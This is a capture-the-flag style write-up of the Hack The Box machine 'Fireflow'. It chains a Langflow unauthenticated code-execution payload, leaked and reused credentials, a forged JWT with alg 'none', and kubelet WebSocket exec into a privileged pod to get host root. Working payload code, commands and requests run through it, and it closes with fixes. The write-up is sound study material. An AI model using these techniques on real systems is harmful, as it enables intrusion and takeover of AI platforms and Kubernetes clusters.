## Summary

Fireflow is a Medium Linux machine built around an AI "flow" platform and a
Kubernetes (k3s) backend. The public site leaks a **Langflow 1.8.2** subdomain
(`flow.fireflow.htb`) whose public-flow build endpoint is vulnerable to
**CVE-2026-33017**, an unauthenticated remote code execution flaw. Code execution
as `www-data` exposes the Langflow superuser password in the process environment,
which is **reused** for the `nightfall` system account (user flag over SSH).

`nightfall` holds credentials for an internal **MCP AI Tool Registry** exposed on a
Kubernetes NodePort. Its JWT verification trusts the `alg: none` header, allowing an
**authentication bypass to the admin role** and registration of a tool whose Python
`code` is executed — RCE inside the `mcp-server` pod. That pod's ServiceAccount is
over-permissioned with **`get nodes/proxy`**, which authorizes a **kubelet
WebSocket `exec`**. Exec-ing into the privileged `node-exporter` pod — running as
root with the host filesystem mounted at `/host/root` — yields the root flag.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Fireflow | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH (22) and HTTPS (443); the TLS certificate names `fireflow.htb` (wildcard `*.fireflow.htb`).
2. `fireflow.htb` leaks the subdomain `flow.fireflow.htb` via an `X-Frame-Options: ALLOW-FROM` header.
3. `flow.fireflow.htb` is **Langflow 1.8.2** with a public playground flow.
4. **CVE-2026-33017** — `POST /api/v1/build_public_tmp/{flow_id}/flow` executes attacker-supplied Python from a flow node's `code` field, with no authentication. Foothold as `www-data`.
5. The Langflow process environment leaks `LANGFLOW_SUPERUSER_PASSWORD`.
6. That password is reused for the `nightfall` user → SSH login → **user flag**.
7. `~/.mcp/config.json` holds credentials for the **MCP AI Tool Registry** (NodePort `30080`).
8. The registry's JWT check accepts `alg: none`; a forged `role: admin` token bypasses authentication.
9. `POST /api/v1/tools` registers a tool whose `code` runs on invocation → RCE inside the `mcp-server` pod (user `mcp`).
10. The pod ServiceAccount has `get nodes/proxy`, authorizing **kubelet `exec` over a GET/WebSocket** request.
11. Exec into the privileged `node-exporter` pod (root, host `/` at `/host/root`) reads **root flag**.

## Reconnaissance

Initial enumeration with **Nmap**. The VPN link had high latency, so scan rate was
kept low with retries.

```bash
nmap -Pn -n -sT --max-retries 4 -p22,443 10.129.45.99
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu 24.04) |
| 443 | HTTPS | nginx, redirects to `https://fireflow.htb/` |

The TLS certificate identified the vhost and a wildcard:

```
Subject: CN=fireflow.htb, O=Task Force Nightfall
Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
```

`fireflow.htb` and `flow.fireflow.htb` were added to `/etc/hosts`.

## Web Enumeration

The landing page at `https://fireflow.htb/` returned a response header pointing at a
second host:

```
X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
```

`flow.fireflow.htb` fingerprinted as **Langflow**:

```bash
curl -sk https://flow.fireflow.htb/api/v1/version
# {"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
curl -sk https://flow.fireflow.htb/api/v1/config
# {"type":"public", ...}
```

A public playground flow was linked from the landing page
(`/playground/7d84d636-...`), and the OpenAPI spec exposed the anonymous
`POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint. Most other API routes
required a JWT or an API key; open user registration produced only inactive
("waiting for approval") accounts.

## Foothold — CVE-2026-33017 (Langflow public-flow RCE)

Langflow < 1.9.0 lets an unauthenticated client build a *public* flow from
**attacker-supplied** flow data via `POST /api/v1/build_public_tmp/{flow_id}/flow`
(with a `client_id` cookie). Each node's `code` field is passed to
`eval_custom_component_code()` → `create_class()`, which compiles and executes it
with no sandbox.

Langflow's loader parses the code (AST) and requires a `Component` subclass before
executing, and it discards bare top-level statements — so the payload is placed in
the **class body**, which runs when the class is defined:

```python
# injected into an existing node's template.code.value
Component = object          # kept top-level assignment
class X(Component):
    import subprocess, urllib.request, base64
    _o = subprocess.run(CMD, shell=True, capture_output=True, text=True)
    _t = _o.stdout + _o.stderr
    raise Exception("PWNSTART::" + _t + "::PWNEND")   # surfaces output in the build error stream
```

The public flow's real node structure was fetched from
`/api/v1/flows/public_flow/{id}`, the `code` value swapped for the payload above,
and the whole graph POSTed back to the build endpoint. The build runs
asynchronously; command output was recovered from the build's SSE `events` stream
(the raised exception message).

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
```

## Lateral Movement — env leak → nightfall

Reading the Langflow process environment exposed the superuser credentials:

```bash
cat /proc/self/environ | tr '\0' '\n' | grep -i LANGFLOW
# LANGFLOW_SUPERUSER=langflow
# LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
# LANGFLOW_SECRET_KEY=...
```

The password was **reused** for the `nightfall` system account:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.45.99 'id; cat user.txt'
# uid=1000(nightfall) ... user flag
```

## Privilege Escalation

### 1. MCP AI Tool Registry — JWT `alg: none` bypass

`nightfall`'s home held a bot credential for an internal service:

```json
// ~/.mcp/config.json
{ "server": "http://10.129.45.99:30080", "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!" }
```

Port `30080` is a Kubernetes NodePort fronting a custom **MCP AI Tool Registry**.
Its `/api/v1/version` advertised JWT auth supporting algorithms `["HS256", "none"]`.
The source (`/app/main.py`, later read via RCE) confirmed the flaw — when the token
header specifies `alg: none`, the signature is not verified:

```python
if alg == "none":
    payload = jose_jwt.decode(token, key="", options={"verify_signature": False})
```

A forged token (`{"alg":"none"}` . `{"role":"admin"}` . ``) satisfies the
`require_admin` dependency. The admin-only `POST /api/v1/tools` registers a tool
with arbitrary Python `code`; the code's **stdout** is returned when the tool is
invoked via the MCP `tools/call` JSON-RPC method:

```
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp-server-54464cb475-29ztf     # a Kubernetes pod
```

### 2. Over-permissioned ServiceAccount — `get nodes/proxy`

The `mcp-server` pod ran as an unprivileged user with a powerless-looking
ServiceAccount, but a `SelfSubjectRulesReview` against the API server revealed one
dangerous grant:

```json
{"verbs":["get"],"apiGroups":[""],"resources":["nodes/proxy"]}
```

`get nodes/proxy` authorizes read access to the kubelet API. Listing pods through
the API-server node proxy exposed a **privileged** monitoring pod:

```
POD monitoring/prometheus-...-node-exporter  hostPID=True  hostNet=True
    vols=[hostPath:/proc, hostPath:/sys, hostPath:/]  priv=[node-exporter:PRIV]
    mounts: root -> /host/root
```

### 3. kubelet `exec` over WebSocket → root

The kubelet authorizes `exec` using the HTTP method's verb. A **POST** `run`/`exec`
maps to `create nodes/proxy` (denied), but a **GET** WebSocket `exec` maps to
`get nodes/proxy` (**allowed**). Talking directly to the kubelet
(`10.129.45.99:10250`) with the pod's ServiceAccount token and a WebSocket upgrade
(`v4.channel.k8s.io`) executed commands inside the node-exporter container, which
runs as **root** with the host filesystem at `/host/root`:

```
GET /exec/monitoring/<node-exporter-pod>/node-exporter?command=/bin/sh&command=-c&command=<cmd>&output=1&error=1
```

```bash
# via kubelet exec
id                       # uid=0(root) gid=65534(nobody) groups=10(wheel)
cat /host/root/root/root.txt   # root flag
```

The host `/` is fully readable (and writable) from this context, giving complete
control of the node.

## Vulnerability Analysis

- **CVE-2026-33017 (Langflow < 1.9.0)** — the public-flow build endpoint executes
  attacker-supplied node `code` with no authentication and no sandbox. *Fix:* upgrade
  to 1.9.0+, never build attacker-controlled flow definitions, set `AUTO_LOGIN=false`,
  and isolate the runtime.
- **Secrets in process environment** — the superuser password sat in the environment
  of a process reachable by RCE. *Fix:* use a secrets store; never reuse service
  passwords for interactive accounts.
- **Password reuse** — the Langflow superuser password was also the `nightfall`
  login. *Fix:* unique credentials per account.
- **JWT `alg: none`** — the MCP registry disabled signature verification when the
  client chose `alg: none`. *Fix:* pin the accepted algorithm to `HS256`; reject
  `none`.
- **Unauthenticated code registration** — an admin endpoint executes arbitrary
  submitted Python. *Fix:* remove dynamic code execution or strongly sandbox it.
- **Over-permissioned ServiceAccount** — `get nodes/proxy` is effectively cluster
  admin via the kubelet. *Fix:* remove `nodes/proxy`; scope RBAC to least privilege.
- **Privileged node-exporter** — running node-exporter as root with `hostPID` and a
  read/write hostPath of `/` turns any exec-into-pod primitive into host root.
  *Fix:* drop privileges, mount host paths read-only, avoid `hostPID`.

## Tools Used

- **Nmap** — port and service discovery
- **curl / OpenSSL** — TLS cert inspection, API enumeration, exploitation
- **Python** (requests / urllib) — CVE-2026-33017 exploit, MCP JWT forgery, raw
  kubelet WebSocket `exec` client
- **sshpass / OpenSSH** — credential validation and shell access
- **Kubernetes API** — `SelfSubjectRulesReview`, node-proxy pod listing

## Key Takeaways

- A single leaked response header (`ALLOW-FROM`) can expose the real attack surface.
- Public "playground"/demo features that build user-supplied graphs are a recurring
  RCE class — CVE-2026-33017 is the Langflow instance of it.
- `alg: none` remains a live JWT footgun in custom services.
- In Kubernetes, `get nodes/proxy` plus one privileged host-mounted pod is a
  complete container-to-host root chain — the kubelet's GET-verb `exec` sidesteps the
  need for `create` on `nodes/proxy`.
